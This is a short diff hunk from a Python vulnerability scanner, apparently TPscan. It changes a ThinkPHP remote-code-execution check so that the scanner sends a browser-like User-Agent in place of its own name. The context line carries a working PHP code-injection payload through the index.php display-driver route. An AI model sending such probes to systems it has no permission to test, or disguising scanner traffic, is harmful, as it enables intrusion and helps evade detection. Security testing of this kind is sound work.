@@ -16,7 +16,7 @@ def thinkphp_driver_display_rce_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
